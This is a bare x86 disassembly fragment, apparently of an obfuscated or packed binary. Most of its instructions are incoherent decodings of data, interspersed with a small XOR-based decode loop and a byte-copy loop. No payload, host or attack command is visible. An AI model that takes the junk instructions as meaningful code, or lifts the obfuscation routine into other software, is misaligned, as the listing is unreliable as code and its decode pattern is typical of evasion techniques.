  4031d7:	fbld   TBYTE PTR [ebx]
  4031d9:	mov    DWORD PTR [eax],0x8b7bff76
  4031df:	stos   DWORD PTR es:[edi],eax
  4031e0:	das    
  4031e1:	inc    ecx
  4031e2:	sub    esp,DWORD PTR ds:0xb20c7477
  4031e8:	and    BYTE PTR [edi+0x20],0x82
  4031ec:	stc    
  4031ed:	addr16 dec ebp
  4031ef:	mov    ch,0xbb
  4031f1:	popf   
  4031f2:	jg     0x403225
  4031f4:	addr16 out dx,al
  4031f6:	les    ebp,FWORD PTR [ecx-0x64]
  4031f9:	pop    ebp
  4031fb:	xor    DWORD PTR [edi-0x20],edx
  4031fe:	mov    ecx,0xeb1275e5
  403203:	cmp    DWORD PTR [ebx-0x6aadc447],edi
  403209:	mov    BYTE PTR [edx+0x31f845c7],dh
  40320f:	test   DWORD PTR [eax+edi*8+0x32f045c7],ebx
  403216:	test   DWORD PTR [eax+edi*8-0x1390f2f7],ebx
  40321d:	inc    edx
  40321e:	add    BYTE PTR [ebx-0x48f007bb],cl
  403224:	or     eax,0x42ec4b
  403229:	adc    DWORD PTR ds:0x430357,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e648,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x4302e1,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	scas   al,BYTE PTR es:[edi]
  40325d:	sub    eax,0x16d2ba65
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x4032b5
  403269:	add    dh,bh
  40326b:	jle    0x403271
  40326d:	rol    esi,0x45
  403270:	cmp    dl,BYTE PTR [edi+0x6c]
  403273:	sbb    edx,ecx
  403275:	stc    
  403276:	test   DWORD PTR [ecx],ebp
  403278:	lahf   
  403279:	sub    BYTE PTR [ebx+0x6a13b662],bh
  40327f:	inc    esp
  403280:	outs   dx,DWORD PTR ds:[esi]
  403281:	xor    al,0xd7
  403283:	jmp    0x6de6:0xe3f48058
  40328a:	cld    
  40328b:	adc    cl,dh
  40328d:	(bad)  
  40328f:	in     al,dx
  403290:	jmp    0x4032d2
  403292:	xor    DWORD PTR [eax],ecx
  403294:	in     eax,dx
  403295:	sub    al,0xe6
  403297:	mov    bl,0x30
  403299:	cmc    
  40329a:	add    edi,DWORD PTR [edi-0x5edb1c1e]
  4032a0:	cmp    bl,BYTE PTR [edx]
  4032a2:	in     al,dx
  4032a3:	push   eax
  4032a4:	icebp  
  4032a5:	aaa    
  4032a6:	xor    cl,BYTE PTR [esi]
  4032a8:	pop    ss
  4032a9:	mov    cs:0x7e5d782e,eax
  4032af:	ret    
  4032b0:	adc    ecx,edx
  4032b2:	cmp    BYTE PTR ds:0xba2f08c1,0x91
  4032b9:	es pop edx
  4032bb:	adc    edi,edi
  4032bd:	push   eax
  4032be:	enter  0xdf65,0x60
  4032c2:	dec    esi
  4032c3:	pop    ds
  4032c4:	mov    al,0x1a
  4032c6:	sbb    eax,DWORD PTR [esi]
  4032c8:	mov    ah,BYTE PTR [edx]
  4032ca:	pop    es
  4032cb:	in     eax,dx
  4032cc:	mov    al,ds:0x996358d2
  4032d1:	lahf   
  4032d2:	fnsave [eax+0x70]
  4032d5:	dec    ebp
  4032d6:	jle    0x4032b7
  4032d8:	mov    esp,0x633569be
  4032dd:	cmp    eax,0x5608eb0
  4032e2:	enter  0x9b63,0xb9
  4032e6:	leave  
  4032e7:	pop    esi
  4032e8:	or     al,0x2e
  4032ea:	outs   dx,BYTE PTR ds:[esi]
  4032eb:	and    BYTE PTR [ecx],dh
  4032ed:	inc    edx
  4032ee:	adc    DWORD PTR [eax+0x2c],esi
  4032f1:	dec    edi
  4032f2:	inc    edx
  4032f3:	retf   0x8668
  4032f6:	fmul   DWORD PTR [eax+0x33a519b9]
  4032fc:	mov    dh,0xd0
  4032fe:	sar    BYTE PTR [eax+0x3f],1
  403301:	sub    DWORD PTR [ecx+0x42107af2],edx
  403307:	mov    WORD PTR [edi-0x54f5b3f4],es
  40330d:	pop    eax
  40330e:	push   edx
  40330f:	add    esp,esi
  403311:	call   0xe5a42c1d
  403316:	fistp  WORD PTR [ebx+0x33]
  403319:	lahf   
  40331a:	loopne 0x403310
  40331c:	in     eax,0xcb
  40331e:	and    bh,dl
  403320:	xchg   esp,eax
  403321:	sar    BYTE PTR [ebp-0x8],0x46
  403325:	in     al,0x5e
  403327:	cdq    
  403328:	sub    eax,0x7ee7dc86
  40332d:	les    ebx,FWORD PTR [esi]
  40332f:	dec    esi
  403330:	add    cl,0x8d
  403333:	add    ch,BYTE PTR [esi-0x396fb66c]
  403339:	dec    eax
  40333a:	mov    ch,0x4f
  40333c:	popf   
  40333d:	inc    dx
  40333f:	int3   
  403340:	mov    ch,0x2
  403342:	or     al,0xdd
  403344:	lahf   
  403345:	xor    edi,DWORD PTR [edi+0x2f1cd76e]
  40334b:	in     al,0x51
  40334d:	jmp    0x403396
  40334f:	dec    eax
  403350:	xchg   DWORD PTR [eax],edi
  403352:	ds adc al,0x2a
  403355:	js     0x403364
  403357:	mov    DWORD PTR [ebx+edx*4-0x74],ecx
  40335b:	jo     0x403358
  40335d:	fcom   DWORD PTR [edx]
  40335f:	cmc    
  403360:	(bad)  
  403361:	dec    edi
  403362:	xchg   BYTE PTR [edi-0x78],ch
  403365:	je     0x403382
  403367:	rol    BYTE PTR [esi+ebp*1],1
  40336a:	stos   BYTE PTR es:[edi],al
  40336b:	jb     0x403371
  40336d:	add    DWORD PTR [esi-0x7df407d7],esi
  403373:	fstp   QWORD PTR [edx+0x5905ef8e]
  403379:	mov    ds:0xc4fc3672,al
  40337e:	iret   
  40337f:	or     eax,0x11b70bff
  403384:	mov    ah,0xac
  403386:	stos   BYTE PTR es:[edi],al
  403387:	das    
  403388:	cwde   
  403389:	and    eax,0xca42d1c1
  40338e:	or     ebx,DWORD PTR [esi-0x50]
  403391:	sub    al,0x9b
  403393:	cli    
  403394:	popa   
  403395:	sub    ebp,DWORD PTR [ebx-0x2868c6e0]
  40339b:	add    DWORD PTR [ebp-0xc],eax
  40339e:	(bad)  
  40339f:	fucom  st(6)
  4033a1:	test   eax,ebp
  4033a3:	pop    eax
  4033a4:	ret    0x8ba1
  4033a7:	dec    ebx
  4033a8:	cwde   
  4033a9:	pusha  
  4033aa:	add    eax,0x294acd58
  4033af:	sub    DWORD PTR [eax-0x1968682d],ebx
  4033b5:	inc    DWORD PTR [edx+0x5d]
  4033b8:	mov    bl,0x9b
  4033ba:	push   esp
  4033bb:	outs   dx,BYTE PTR ds:[esi]
  4033bc:	push   edx
  4033bd:	dec    edx
  4033be:	mov    edi,0x62e80c70
  4033c3:	je     0x40338d
  4033c5:	dec    ebp
  4033c6:	mov    edi,0x502566a9
  4033cb:	dec    DWORD PTR [ecx-0x60]
  4033ce:	mov    ah,cl
  4033d0:	stc    
  4033d1:	iret   
  4033d2:	enter  0x705c,0xf1
  4033d6:	fnstenv [edi-0x2e6f471b]
  4033dc:	pusha  
  4033dd:	cli    
  4033de:	dec    esp
  4033df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033e0:	mov    ds:0x2d5cfc73,al
  4033e5:	scas   al,BYTE PTR es:[edi]
  4033e6:	ret    
  4033e7:	lds    ebx,FWORD PTR [edx-0x56d1dbbb]
  4033ed:	jge    0x4033fa
  4033ef:	repnz cmp eax,DWORD PTR [edi]
  4033f2:	cmp    BYTE PTR [ebx+0x5b],cl
  4033f5:	lds    ebp,FWORD PTR [ecx+0x78]
  4033f8:	xchg   BYTE PTR [ebp+0x17],cl
  4033fb:	inc    ebp
  4033fc:	adc    ah,al
  4033fe:	adc    DWORD PTR [ebx+ebx*1-0x77],esi
  403402:	ss pop edx
  403404:	jno    0x4033ec
  403406:	cmp    BYTE PTR [ebx+0x1a],0xd7
  40340a:	and    eax,0x2c6dc8fb
  40340f:	cli    
  403410:	out    dx,al
  403411:	out    dx,eax
  403412:	loopne 0x4033f8
  403414:	sti    
  403415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403416:	cmp    dl,bh
  403418:	mov    esi,0x32729b
  40341d:	neg    DWORD PTR ds:0x4302d9
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	minps  xmm5,XMMWORD PTR [ecx]
  403455:	jl     0x403459
  403457:	adc    al,0x7e
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x4033e2
  40345f:	cmc    
  403460:	icebp  
  403461:	js     0x4033f0
  403463:	(bad)  
  403464:	mov    ebx,0x3423c5ca
  403469:	mov    ebp,0xb64e1344
  40346e:	stc    
  40346f:	scas   eax,DWORD PTR es:[edi]
  403470:	xchg   edi,eax
  403471:	mov    DWORD PTR [ebx+0x50],ebp
  403474:	bound  edi,QWORD PTR [ebx+0x31]
  403477:	pop    eax
  403478:	fcmovnu st,st(1)
  40347a:	adc    dh,dh
  40347c:	aaa    
  40347d:	out    0x44,al
  40347f:	cmc    
  403480:	lds    edi,FWORD PTR [ebx+0x3a266d36]
  403486:	pop    edi
  403487:	enter  0x6dc1,0xaf
  40348b:	adc    al,BYTE PTR [edi]
  40348d:	cmp    edx,DWORD PTR [edi]
  40348f:	pusha  
  403490:	jl     0x4034e8
  403492:	cmp    ebx,DWORD PTR [eax-0x4eb84620]
  403498:	mov    bh,0xb5
  40349a:	sbb    DWORD PTR [ebp-0x3a7f3740],ebx
  4034a0:	clc    
  4034a1:	xor    BYTE PTR [edi-0x5c],al
  4034a4:	nop
  4034a5:	mov    bh,dl
  4034a7:	pop    ebp
  4034a8:	sub    BYTE PTR [ebx+0x406e4ec4],ah
  4034ae:	push   0xff92617b
  4034b3:	xchg   edi,eax
  4034b4:	mov    ebx,0xbb00d118
  4034b9:	mov    esp,0x1709cad4
  4034be:	adc    DWORD PTR [eax-0x4811a860],esp
  4034c4:	adc    DWORD PTR [esi],edi
  4034c6:	jge    0x4034ea
  4034c8:	cmp    dh,BYTE PTR [ecx]
  4034ca:	mov    DWORD PTR [ecx-0x126283fd],0x9ed2af83
  4034d4:	fst    DWORD PTR [esi]
  4034d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034d7:	in     al,0x13
  4034d9:	dec    BYTE PTR [eax]
  4034db:	aaa    
  4034dc:	xor    BYTE PTR [edi+0x7041fb5f],bh
  4034e2:	jbe    0x403504
  4034e4:	cld    
  4034e5:	pop    ebp
  4034e6:	xor    DWORD PTR [edi+0x28],edx
  4034e9:	push   esi
  4034ea:	xor    ah,BYTE PTR [ecx+ecx*1+0x20]
  4034ee:	mov    DWORD PTR [ecx-0x58],ebp
  4034f1:	push   ecx
  4034f2:	sbb    ch,bh
  4034f4:	push   esi
  4034f5:	arpl   WORD PTR [edi],cx
  4034f7:	loop   0x403481
  4034f9:	dec    ebp
  4034fa:	xchg   ecx,eax
  4034fb:	mov    al,BYTE PTR [edi]
  4034fd:	fxch   st(5)
  4034ff:	repnz test dl,al
  403502:	aaa    
  403503:	or     cl,bl
  403505:	ins    DWORD PTR es:[edi],dx
  403506:	mov    edx,0xeb261c74
  40350b:	sub    al,0xe1
  40350d:	pop    eax
  40350e:	loopne 0x4034de
  403510:	retf   
  403511:	push   es
  403512:	out    0xcd,al
  403514:	add    DWORD PTR [esi],esi
  403516:	add    esi,0x51
  403519:	mov    bl,0x47
  40351b:	shl    ecx,0x16
  40351e:	adc    al,BYTE PTR [ebp+eax*1-0x330b09e3]
  403525:	out    0x9b,eax
  403527:	cmp    BYTE PTR [edi],cl
  403529:	jg     0x40357a
  40352b:	jg     0x403522
  40352d:	push   cs
  40352e:	adc    ch,al
  403530:	pop    es
  403531:	loopne 0x4034ba
  403533:	dec    eax
  403534:	cmp    eax,0xb56dc7a5
  403539:	pop    ebp
  40353a:	jmp    0x4034c0
  40353c:	cmp    al,0xba
  40353e:	pop    ecx
  40353f:	mov    bh,0x49
  403541:	adc    bl,cl
  403543:	jmp    0xc2b7:0x6b75c427
  40354a:	imul   edx,DWORD PTR [ecx-0x63ed09c2],0xffffff9f
  403551:	inc    edx
  403552:	and    DWORD PTR [edx],edx
  403554:	jae    0x4035a5
  403556:	push   eax
  403557:	or     bl,al
  403559:	in     al,dx
  40355a:	adc    ebp,DWORD PTR [edx-0x6a40cfee]
  403560:	stc    
  403561:	sti    
  403562:	cmp    al,BYTE PTR [edi]
  403564:	sti    
  403565:	cmp    dl,BYTE PTR [eax-0x56]
  403568:	add    eax,0x7513e7c1
  40356d:	pop    ecx
  40356e:	stos   BYTE PTR es:[edi],al
  40356f:	ret    0xd53f
  403572:	fsub   st(5),st
  403574:	push   cs
  403575:	hlt    
  403576:	jl     0x403565
  403578:	or     al,0xdb
  40357a:	pop    eax
  40357b:	(bad)  [esi-0x1238df7]
  403581:	loope  0x4035bb
  403583:	xor    DWORD PTR [ebp-0x69],esi
  403586:	xchg   ebp,eax
  403587:	cmp    DWORD PTR [ebx+0x40],eax
  40358a:	jns    0x40352f
  40358c:	push   edi
  40358d:	out    dx,al
  40358e:	stos   BYTE PTR es:[edi],al
  40358f:	idiv   eax
  403591:	fld    st(1)
  403593:	mov    cl,0xa3
  403595:	aad    0x6c
  403597:	cmp    ebp,DWORD PTR [ecx]
  403599:	jns    0x4035d3
  40359b:	fst    DWORD PTR ds:0x6bda3e7b
  4035a1:	xchg   edx,eax
  4035a2:	(bad)
  4035a5:	retf   0xe275
  4035a8:	sbb    bh,BYTE PTR [esi]
  4035aa:	pop    ecx
  4035ab:	sbb    DWORD PTR [eax-0x7cc10c95],esp
  4035b1:	aas    
  4035b2:	lock push ebp
  4035b4:	scas   al,BYTE PTR es:[edi]
  4035b5:	mov    WORD PTR [edx],cs
  4035b7:	les    eax,FWORD PTR [edx]
  4035b9:	mov    ebp,0x3efed749
  4035be:	mov    ecx,0xc87ee347
  4035c3:	outs   dx,BYTE PTR ds:[esi]
  4035c4:	mov    ah,0xae
  4035c6:	addr16 loope 0x40359d
  4035c9:	loop   0x403599
  4035cb:	mov    ch,0x6b
  4035cd:	adc    ecx,edi
  4035cf:	ins    BYTE PTR es:[edi],dx
  4035d0:	int3   
  4035d1:	sbb    eax,0xa77204ff
  4035d6:	jno    0x4035e1
  4035d8:	shl    DWORD PTR [ebx],0xb2
  4035db:	xlat   BYTE PTR ds:[ebx]
  4035dc:	adc    ecx,DWORD PTR [ebx-0x7]
  4035df:	pop    ebx
  4035e0:	and    bh,BYTE PTR [edi+0x1e30da9c]
  4035e6:	mov    al,0xd0
  4035e8:	popf   
  4035e9:	(bad)  
  4035ea:	icebp  
  4035eb:	fsubr  st(6),st
  4035ed:	(bad)  
  4035ee:	pop    eax
  4035ef:	push   eax
  4035f0:	mov    eax,DWORD PTR [ecx+ebx*8]
  4035f3:	mov    ds:0x50f722a3,al
  4035f8:	or     eax,0xc8895a6a
  4035fd:	call   0x8d95:0xc759
  403603:	fucomip st,st(6)
  403605:	rcr    edx,1
  403607:	lods   al,BYTE PTR ds:[esi]
  403608:	sbb    DWORD PTR [edi+0xe4e2397],0xd603d133
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x33dd7c8
  40366f:	in     al,dx
  403670:	sbb    DWORD PTR [ecx+0x7e7e15b2],ebp
  403676:	scas   al,BYTE PTR es:[edi]
  403677:	jg     0x4036f7
  403679:	jle    0x40368c
  40367b:	inc    ebx
  40367c:	cmc    
  40367d:	add    BYTE PTR [ecx],al
  40367f:	test   BYTE PTR [eax-0x72],dh
  403682:	or     DWORD PTR [eax-0x38],edx
  403685:	aaa    
  403686:	outs   dx,BYTE PTR ds:[esi]
  403687:	rdmsr  
  403689:	dec    esi
  40368a:	dec    bp
  40368c:	sahf   
  40368d:	repz xor dh,dh
  403690:	mov    al,0x68
  403692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403693:	mov    esi,DWORD PTR [eax-0x2d2dbe60]
  403699:	fucomi st,st(7)
  40369b:	push   0xfffffffb
  40369d:	push   ebp
  40369e:	test   al,0x53
  4036a0:	sbb    eax,0xfcc83d6e
  4036a5:	sub    ecx,DWORD PTR [edi+0x26d8310a]
  4036ab:	test   eax,0xb61b34bc
  4036b0:	xchg   esp,eax
  4036b1:	mov    ds,eax
  4036b3:	xor    eax,0x4d40bdb4
  4036b8:	sti    
  4036b9:	stos   BYTE PTR es:[edi],al
  4036ba:	xor    al,BYTE PTR [edx+0x23]
  4036bd:	das    
  4036be:	pop    es
  4036bf:	jle    0x403696
  4036c1:	retf   0x16cf
  4036c4:	shl    DWORD PTR [edi-0x33],1
  4036c7:	iret   
  4036c8:	dec    edx
  4036c9:	pop    es
  4036ca:	sub    eax,0xbf32a348
  4036cf:	cmc    
  4036d0:	daa    
  4036d1:	emms   
  4036d3:	sahf   
  4036d4:	adc    al,0x49
  4036d6:	adc    eax,0x921213d5
  4036db:	inc    ebp
  4036dc:	inc    esp
  4036dd:	sbb    DWORD PTR [esi],0x868b07de
  4036e3:	scas   al,BYTE PTR es:[edi]
  4036e4:	pop    ecx
  4036e5:	hlt    
  4036e6:	xlat   BYTE PTR ds:[ebx]
  4036e7:	das    
  4036e8:	mov    al,0x7b
  4036ea:	add    al,0x48
  4036ec:	retf   0x84b5
  4036ef:	out    0x8,al
  4036f1:	xchg   esi,eax
  4036f2:	cmp    esp,DWORD PTR [esi-0x78]
  4036f5:	in     al,0x8b
  4036f7:	or     ebx,DWORD PTR [ebp+0x42edf75e]
  4036fd:	pop    edi
  4036fe:	xor    al,0xca
  403700:	dec    ebp
  403701:	mov    bl,cl
  403703:	in     eax,dx
  403704:	call   0x17385c1e
  403709:	leave  
  40370a:	dec    edi
  40370b:	mov    cl,0x77
  40370d:	or     DWORD PTR [ebx],0xd84c82db
  403713:	out    dx,al
  403714:	mov    fs,WORD PTR [eax-0x13]
  403717:	(bad)  
  403719:	ja     0x4036f0
  40371b:	bound  ecx,QWORD PTR [edx-0x4e8e5fd5]
  403721:	(bad)
  403726:	jns    0x40378c
  403728:	push   ebp
  403729:	add    eax,0xca472779
  40372e:	cmp    esi,0x3a
  403731:	stc    
  403732:	mov    edx,0xf4162f4c
  403737:	mov    ecx,0xbc8039fe
  40373c:	lahf   
  40373d:	clc    
  40373e:	in     al,0x49
  403740:	xor    dh,BYTE PTR [esi+0x53]
  403743:	push   ebx
  403744:	add    DWORD PTR [esi],ebx
  403746:	(bad)  
  403747:	stc    
  403748:	jno    0x403703
  40374a:	dec    ebx
  40374b:	xchg   ebx,eax
  40374c:	cmc    
  40374d:	push   cs
  40374e:	dec    esi
  40374f:	xor    edx,ecx
  403751:	aas    
  403752:	rcr    DWORD PTR [ecx-0x56d66ab9],0x1f
  403759:	mov    ah,0x78
  40375b:	jmp    0x20e1:0xdaa6716d
  403762:	xchg   BYTE PTR [esi+edx*8+0x41],bh
  403766:	test   eax,0xff6601af
  40376b:	fild   WORD PTR [eax]
  40376d:	jmp    0x4037d5
  40376f:	xor    al,0xb6
  403771:	fs cmp al,0xd0
  403774:	inc    edi
  403775:	push   ds
  403776:	sbb    dl,dh
  403778:	lods   eax,DWORD PTR ds:[esi]
  403779:	(bad)  
  40377a:	jge    0x403744
  40377c:	adc    DWORD PTR [ebp+ecx*8+0x60],0x5febd5c6
  403784:	(bad)  
  403785:	fild   WORD PTR [ebp+0x4f]
  403788:	jge    0x40375e
  40378a:	xchg   ch,bl
  40378c:	and    bl,BYTE PTR [edx-0x9]
  40378f:	inc    ebx
  403790:	int3   
  403791:	fidiv  WORD PTR [ecx+ebp*8]
  403794:	add    eax,0x7a3fdb03
  403799:	in     eax,0xb0
  40379b:	cld    
  40379c:	jmp    0xf7d942f1
  4037a1:	xchg   esp,eax
  4037a2:	je     0x4037e1
  4037a4:	pop    eax
  4037a5:	out    dx,eax
  4037a6:	jb     0x40378d
  4037a8:	retf   
  4037a9:	es fcmovbe st,st(2)
  4037ac:	mul    esp
  4037ae:	nop
  4037af:	sahf   
  4037b0:	retf   
  4037b1:	lahf   
  4037b2:	ins    DWORD PTR es:[edi],dx
  4037b3:	push   esp
  4037b4:	push   ebx
  4037b5:	xor    DWORD PTR [edx],ebp
  4037b7:	mov    es,WORD PTR [eax-0x113f7739]
  4037bd:	cmp    al,0xf4
  4037bf:	mov    esi,0x2a918ee7
  4037c4:	loop   0x4037ab
  4037c6:	push   esp
  4037c7:	and    ebp,DWORD PTR [ebx-0x71827f52]
  4037cd:	pop    edi
  4037ce:	inc    ebx
  4037cf:	loop   0x40384e
  4037d1:	nop
  4037d2:	cli    
  4037d3:	js     0x403806
  4037d5:	es push ecx
  4037d7:	cmp    esi,DWORD PTR [eax]
  4037d9:	add    al,0xd3
  4037db:	xchg   ecx,eax
  4037dc:	mov    esp,esp
  4037de:	xchg   ecx,eax
  4037df:	punpckhbw mm5,mm4
  4037e2:	mov    bh,0xe4
  4037e4:	push   ebp
  4037e5:	push   edx
  4037e6:	les    eax,FWORD PTR [ebp+0x6f]
  4037e9:	dec    edx
  4037ea:	sub    BYTE PTR ds:0x1a69cd52,cl
  4037f0:	not    BYTE PTR [esi]
  4037f2:	mov    ch,0x17
  4037f4:	mov    ds:0xa12862b5,al
  4037f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037fa:	xchg   edx,eax
  4037fb:	addr16 pop ebp
  4037fd:	inc    esi
  4037fe:	add    cl,BYTE PTR [eax-0x57a0d3b4]
  403804:	jae    0x403869
  403806:	xor    al,0x76
  403808:	sahf   
  403809:	ss pop ecx
  40380b:	lahf   
  40380c:	loop   0x403832
  40380e:	mov    al,0x72
  403810:	xor    DWORD PTR [ecx],edi
  403812:	sbb    eax,0x4226ed3
  403817:	mul    esi
  403819:	jp     0x40389a
  40381b:	dec    esi
  40381c:	fadd   QWORD PTR [eax]
  40381e:	mov    esi,0xc2ee1000
  403823:	test   al,0x63
  403825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403826:	adc    eax,0x8b92f76f
  40382b:	push   ebp
  40382c:	adc    BYTE PTR [ebx],dh
  40382e:	rol    DWORD PTR [ebx],0xc6
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0xd7ba8b23
  403845:	dec    eax
  403846:	loop   0x40385b
  403848:	jle    0x4038c8
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x403884
  40384f:	jno    0x40382c
  403851:	into   
  403852:	sub    eax,0xfa2ea977
  403857:	scas   eax,DWORD PTR es:[edi]
  403858:	and    dl,bl
  40385a:	sub    eax,0x462a213f
  40385f:	jle    0x40380d
  403861:	mov    edx,0x3fddaef7
  403866:	addr16 jp 0x40382e
  403869:	pop    esi
  40386a:	out    0xe8,eax
  40386c:	jnp    0x403894
  40386e:	jo     0x40382b
  403870:	dec    edx
  403871:	inc    ebp
  403872:	and    eax,0xd89b861c
  403877:	ja     0x403860
  403879:	loop   0x403811
  40387b:	pavgb  mm1,QWORD PTR [ebx+edx*1+0x56f5b80d]
  403883:	icebp  
  403884:	and    BYTE PTR [eax-0x2d],dh
  403887:	sbb    BYTE PTR [ebp+0x5f8cafcd],dl
  40388d:	call   0xaef63c07
  403892:	sub    dl,BYTE PTR [edx+0x3b570306]
  403898:	cli    
  403899:	lods   al,BYTE PTR ds:[esi]
  40389a:	add    edx,edi
  40389c:	and    al,0xea
  40389e:	into   
  40389f:	xchg   esp,eax
  4038a0:	pop    es
  4038a1:	cld    
  4038a2:	mov    cl,0x86
  4038a4:	loop   0x403916
  4038a6:	clc    
  4038a7:	add    eax,0xdfef7327
  4038ac:	inc    eax
  4038ad:	call   0x13c5ad94
  4038b2:	aas    
  4038b3:	ficomp DWORD PTR [ebp-0xfd367ba]
  4038b9:	add    DWORD PTR [eax+0x38],0xb33e40ab
  4038c0:	ret    
  4038c1:	adc    edx,ebp
  4038c3:	pop    ebx
  4038c4:	in     eax,0x39
  4038c6:	loopne 0x403891
  4038c8:	add    eax,0x955ce061
  4038cd:	loope  0x403910
  4038cf:	push   0xa6f2fab6
  4038d4:	ret    
  4038d5:	aam    0xe3
  4038d7:	call   0x23420d0f
  4038dc:	iret   
  4038dd:	and    eax,0xa85fb07d
  4038e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038e3:	push   DWORD PTR [ecx+0x66]
  4038e6:	adc    eax,0x20216119
  4038eb:	adc    dh,dh
  4038ed:	in     al,0x40
  4038ef:	int3   
  4038f0:	(bad)  
  4038f1:	into   
  4038f2:	ds dec edi
  4038f4:	jno    0x40393d
  4038f6:	call   0x4bd533f6
  4038fb:	es std 
  4038fd:	(bad)  
  4038fe:	push   0xffffffa4
  403900:	mov    al,0x95
  403902:	mov    ds,WORD PTR [edi]
  403904:	jmp    0x54de76bc
  403909:	mov    esp,0x6a5e1553
  40390e:	int    0xd6
  403910:	xor    DWORD PTR [esi+0x1c],ebp
  403913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403914:	inc    ebp
  403915:	and    ah,ah
  403917:	xor    BYTE PTR [ecx],ch
  403919:	ins    DWORD PTR es:[edi],dx
  40391a:	imul   BYTE PTR ds:0x5285ae5d
  403920:	test   eax,0xdb96d996
  403925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403926:	(bad)  [edx-0x413041b4]
  40392c:	popf   
  40392d:	push   es
  40392e:	rcl    BYTE PTR [edi],0x94
  403931:	je     0x40396f
  403933:	shl    dl,cl
  403935:	dec    ecx
  403936:	cmp    DWORD PTR [ebx+eax*1],edx
  403939:	ins    BYTE PTR es:[edi],dx
  40393a:	(bad)  
  40393c:	adc    al,0xfc
  40393e:	adc    BYTE PTR [ebx-0x11],dh
  403941:	mov    esi,0x5d0f4b58
  403946:	test   DWORD PTR [ecx],eax
  403948:	cli    
  403949:	popa   
  40394a:	sahf   
  40394b:	mov    al,bh
  40394d:	pop    ebx
  40394e:	dec    edi
  40394f:	shl    DWORD PTR [edi+0x36f982f0],0x29
  403956:	das    
  403957:	xor    al,0xc5
  403959:	dec    edx
  40395a:	out    dx,al
  40395b:	out    0x34,eax
  40395d:	push   0xbb31c4c
  403962:	je     0x403982
  403964:	shl    DWORD PTR [esi+0x4e],1
  403967:	inc    esi
  403968:	or     esp,eax
  40396a:	pusha  
  40396b:	xor    ecx,DWORD PTR [esi-0x15]
  40396e:	hlt    
  40396f:	cdq    
  403970:	aad    0x38
  403972:	addr16 int 0x1c
  403975:	cmp    eax,0xd32444f6
  40397a:	dec    ebx
  40397b:	ins    BYTE PTR es:[edi],dx
  40397c:	int    0x2b
  40397e:	inc    esi
  40397f:	mov    bl,0xb4
  403981:	or     al,0x79
  403983:	loope  0x403945
  403985:	add    al,BYTE PTR [ebp+0x33]
  403988:	add    eax,DWORD PTR ds:0xb742e931
  40398e:	fdiv   DWORD PTR [esi-0x65]
  403991:	xchg   ebp,eax
  403992:	in     al,0xbb
  403994:	aad    0x74
  403996:	sahf   
  403997:	pop    ebp
  403998:	pop    ss
  403999:	pop    es
  40399a:	xchg   ecx,eax
  40399b:	(bad)
  40399e:	jmp    0xbaaa:0x3c0b5202
  4039a5:	pop    edi
  4039a6:	add    eax,0x9afa78a3
  4039ab:	dec    edi
  4039ac:	xor    eax,0x7dc7c5b5
  4039b1:	xor    ch,BYTE PTR [ecx]
  4039b3:	jbe    0x403941
  4039b5:	pop    esi
  4039b6:	or     ecx,DWORD PTR [edx-0x5e]
  4039b9:	add    BYTE PTR [edx],dl
  4039bb:	test   BYTE PTR ds:0x4efb1fa0,dh
  4039c1:	mov    esp,0xa647d904
  4039c6:	push   es
  4039c7:	in     al,dx
  4039c8:	loop   0x403a0b
  4039ca:	dec    ecx
  4039cb:	inc    DWORD PTR [ebp-0x5add374]
  4039d1:	mov    BYTE PTR [edi],dh
  4039d3:	jb     0x403961
  4039d5:	(bad)  
  4039d6:	cmp    ah,BYTE PTR [ebx-0x4c979ce7]
